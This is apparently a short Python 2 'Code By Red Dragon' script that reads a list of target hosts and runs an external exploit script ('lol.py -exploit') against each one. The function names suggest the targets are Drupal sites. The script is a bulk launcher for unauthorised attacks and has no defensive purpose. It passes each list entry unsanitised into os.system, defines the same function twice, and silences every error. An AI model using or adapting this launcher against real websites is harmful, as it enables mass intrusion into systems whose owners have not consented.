# -*- coding: utf-8 -*
from __future__ import unicode_literals
#!/usr/bin/python
import os, sys, codecs, random               
from multiprocessing.dummy import Pool                          
from time import time as timer  
import time                     
from platform import system 
import warnings
import subprocess
from colorama import init
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
try:
    print ("""Code By Red Dragon """)
    spy = raw_input('List : ')
    with codecs.open(spy, mode='r', encoding='ascii', errors='ignore') as f:
        lists = f.read().splitlines()
except IndexError:
    pass
lists = list((lists))


def Drupal9(l):
    try:        
        if 'wakkkad' in l.content:
            pass
    except:
        pass
def Drupal9(l):
    try:        
        os.system('python lol.py -exploit ' + l + ' 48 hex 9')
    except:
        pass

def Exploit(l):
    try:
        Drupal9(l)
    except:
        pass


def Main():
    try:
        pp = Pool(1)
        pr = pp.map(Exploit, lists)
    except:
        pass


if __name__ == '__main__':
    Main()
